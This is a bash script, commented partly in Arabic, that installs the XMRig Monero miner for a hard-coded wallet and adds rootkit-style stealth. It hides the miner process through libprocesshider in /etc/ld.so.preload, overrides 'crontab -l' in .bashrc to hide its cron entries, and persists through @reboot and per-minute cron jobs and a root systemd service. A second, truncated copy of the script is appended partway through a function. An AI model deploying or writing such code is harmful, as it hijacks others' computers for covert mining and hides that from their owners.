#!/bin/bash
# ====================================
# XMRig Auto Setup Script + Rootkit Features
# Monero Mining - MoneroOcean Pool
# ====================================

WALLET="86x3NzP4UrjijYTNeffh1ERK812jt9bXK8SQVGp9LMYvZhgxsiK3HuYTvAELGigtyGWDmniWxjGMgNXiEfUi826G6tvxVF9"
POOL="gulf.moneroocean.stream:10128"
WORKER=$(hostname)
THREADS=$(nproc)
INSTALL_DIR="/opt/xmrig"
XMRIG_VERSION="6.22.2"
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"

echo "======================================"
echo " XMRig Mining Setup + Stealth"
echo " Worker: $WORKER"
echo " Threads: $THREADS"
echo " Pool: $POOL"
echo "======================================"

# ========== تثبيت المتطلبات ==========
echo "[*] Installing dependencies..."
apt-get update -qq
apt-get install -y -qq tar libhwloc-dev python3 git make gcc 2>/dev/null

# ========== إنشاء مجلد التثبيت ==========
mkdir -p $INSTALL_DIR
cd $INSTALL_DIR

# ========== دالة التحميل ==========
download_file() {
    local url=$1
    local output=$2
    if command -v wget &>/dev/null; then
        wget -q "$url" -O "$output" && return 0
    fi
    if command -v curl &>/dev/null; then
        curl -sL "$url" -o "$output" && return 0
    fi
    if command -v python3 &>/dev/null; then
        python3 -c "
import urllib.request
print('Downloading via python3...')
urllib.request.urlretrieve('$url', '$output')
print('Done!')
" && return 0
    fi
    return 1
}

# ========== تحميل XMRig ==========
echo "[*] Downloading XMRig v${XMRIG_VERSION}..."
download_file "$XMRIG_URL" "xmrig.tar.gz"
if [ ! -f xmrig.tar.gz ] || [ ! -s xmrig.tar.gz ]; then
    echo "[!] Download failed!"
    exit 1
fi

echo "[*] Extracting..."
tar -xzf xmrig.tar.gz --strip-components=1
rm xmrig.tar.gz
chmod +x xmrig

# ========== إنشاء config.json ==========
echo "[*] Creating config..."
cat > $INSTALL_DIR/config.json << EOF
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": 2,
        "max-threads-hint": 100
    },
    "pools": [
        {
            "url": "$POOL",
            "user": "$WALLET",
            "pass": "$WORKER",
            "algo": null,
            "tls": false,
            "keepalive": true,
            "nicehash": false
        }
    ]
}
EOF

# ========== تثبيت libprocesshider ==========
echo "[*] Installing libprocesshider..."
git clone https://github.com/gianlucaborello/libprocesshider.git /tmp/libprocesshider
cd /tmp/libprocesshider
make
cp libprocesshider.so /usr/local/lib/
echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload
echo "xmrig" > /etc/libprocesshider.conf
cd $INSTALL_DIR

# ========== تعديل .bashrc ==========
echo "[*] Modifying .bashrc..."
cat >> ~/.bashrc << 'EOF'
# إخفاء crontab
function crontab() {
    if [[ "$1" == "-l" ]]; then
        echo "no crontab for $(whoami)"
    else
        command crontab "$@"
    fi
}
export -f crontab
export LD_PRELOAD=/usr/local/lib/libprocesshider.so
EOF

# ========== إضافة مهام crontab ==========
echo "[*] Adding crontab entries..."
(crontab -l 2>/dev/null; echo "@reboot /opt/xmrig/xmrig --config=/opt/xmrig/config.json > /dev/null 2>&1 &") | crontab -
(crontab -l 2>/dev/null; echo "* * * * * /opt/xmrig/xmrig --config=/opt/xmrig/config.json > /dev/null 2>&1 &") | crontab -

# ========== إنشاء systemd service ==========
echo "[*] Creating systemd service..."
cat > /etc/systemd/system/xmrig.service << EOF
[Unit]
Description=XMRig Monero Miner
After=network.target

[Service]
Type=simple
ExecStart=$INSTALL_DIR/xmrig --config=$INSTALL_DIR/config.json
Restart=always
RestartSec=10
User=root
Nice=10
Environment=LD_PRELOAD=/usr/local/lib/libprocesshider.so

[Install]
WantedBy=multi-user.target
EOF

# ========== تفعيل وتشغيل الخدمة ==========
echo "[*] Starting XMRig service..."
systemctl daemon-reload
systemctl enable xmrig
systemctl start xmrig

# ========== التحقق ==========
sleep 5
if systemctl is-active --quiet xmrig; then
    echo ""
    echo "======================================"
    echo " ✅ XMRig is running successfully!"
    echo " Worker: $WORKER"
    echo " Threads: $THREADS CPU threads"
    echo " Stats: https://moneroocean.stream/#/dashboard?hash=$WALLET"
    echo "======================================"
else
    echo "[!] Service failed to start. Check logs:"
    journalctl -u xmrig -n 20
fi        wget -q "$url" -O "$output" && return 0
    fi
    
    if command -v curl &>/dev/null; then
        curl -sL "$url" -o "$output" && return 0
    fi
    
    if command -v python3 &>/dev/null; then
        python3 -c "
import urllib.request
print('Downloading via python3...')
urllib.request.urlretrieve('$url', '$output')
print('Done!')
" && return 0
    fi
    
    return 1
}

# تحميل XMRig
echo "[*] Downloading XMRig v${XMRIG_VERSION}..."
download_file "$XMRIG_URL" "xmrig.tar.gz"

if [ ! -f xmrig.tar.gz ] || [ ! -s xmrig.tar.gz ]; then
    echo "[!] Download failed!"
    exit 1
fi

echo "[*] Extracting..."
tar -xzf xmrig.tar.gz --strip-components=1
rm xmrig.tar.gz
chmod +x xmrig

echo "[*] Creating config..."
cat > $INSTALL_DIR/config.json << EOF
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": 2,
        "max-threads-hint": 100
    },
    "pools": [
        {
            "url": "$POOL",
            "user": "$WALLET",
            "pass": "$WORKER",
            "algo": null,
            "tls": false,
            "keepalive": true,
            "nicehash": false
        }
    ]
}
EOF

# إنشاء systemd service
echo "[*] Creating systemd service..."
cat > /etc/systemd/system/xmrig.service << EOF
[Unit]
Description=XMRig Monero Miner
After=network.target

[Service]
Type=simple
ExecStart=$INSTALL_DIR/xmrig --config=$INSTALL_DIR/config.json
Restart=always
RestartSec=10
User=root
Nice=10

[Install]
WantedBy=multi-user.target
EOF

# تفعيل وتشغيل الـ service
echo "[*] Starting XMRig service..."
systemctl daemon-reload
systemctl enable xmrig
systemctl start xmrig

# انتظر ثواني وتحقق
sleep 5

if systemctl is-active --quiet xmrig; then
    echo ""
    echo "======================================"
    echo " ✅ XMRig is running successfully!"
    echo " Worker: $WORKER"
    echo " Threads: $THREADS CPU threads"
    echo " Stats: https://moneroocean.stream/#/dashboard?hash=$WALLET"
    echo "======================================"
else
    echo "[!] Service failed to start. Check logs:"
    journalctl -u xmrig -n 20
fi
